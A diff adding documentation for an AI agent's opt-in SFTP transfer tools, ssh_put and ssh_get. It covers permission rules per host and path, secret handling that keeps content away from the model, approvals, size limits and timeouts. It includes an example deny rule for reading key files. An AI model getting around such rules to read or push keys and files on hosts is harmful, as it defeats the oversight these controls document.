+over SFTP, as the host's own `sftp-server` serves it. They are off by
+default, so turning on `ssh` alone gives no new way to change a host.
+
+```json
+"ssh": { "enabled": true, "transfers": true, "transfer_max_mb": 16 }
+```
+
+- `ssh_put` writes `remote_path` (absolute and clean) on a host from a
+  workspace `file` or a stored `secret` by NAME, with `mode` (octal; 0644
+  for a file, 0600 for a secret, by default). What is sent never passes
+  through the model: a TLS key goes from the secrets store to the host.
+  Where the server can rename over a file (OpenSSH's `posix-rename`), the
+  content is written beside the target and renamed over it, so a failed
+  transfer leaves the old file; elsewhere it is written in place.
+- `ssh_get` reads `remote_path` into a workspace `file`. A new file is
+  readable by its owner only; an existing one is replaced only if the
+  session has read it, and the change can be undone like a write.
+
+Both always ask unless an allow rule covers them, and read as
+`host:remote_path`, so `ssh_get(web1:/etc/nginx/*)` allows fetching the
+nginx configuration from `web1` and nothing else. Rules on `ssh` do not
+cover them. A secret needs its own `secret(NAME)` rule; the workspace file
+is judged as a `read` (for `ssh_put`) or `write` (for `ssh_get`) of it would
+be, so `deny read(*.key)` and `ask write(*.conf)` hold here too. That
+judgement is by the rules alone: an extension hook judges the `ssh_put` or
+`ssh_get` call itself, with the file's path in its arguments, and is not
+asked again about a `read` or `write` that is not being made. The
+approval names the account, address, path, source and mode, and the result
+gives the size and sha256 of what moved (for a stored secret, its
+fingerprint instead, as for Secrets above); neither, nor the record, holds
+the content. A file over `transfer_max_mb` (16 MiB by default, at most
+1024) is refused before it is read or sent. A transfer ends after five
+minutes, or when the turn is stopped, whatever the host does: a host that
+stops answering has its SFTP session, then its connection, closed. A call
+that cannot succeed (an unknown host, a relative or unclean path, a source
+that cannot be read) is refused before anyone is asked. A workspace configuration can only turn
+transfers off or lower the bound.
 
 Credentials, in order of preference: the **SSH agent** (the key never leaves
 it), then `identity_file`, then `password_env` — which names an environment
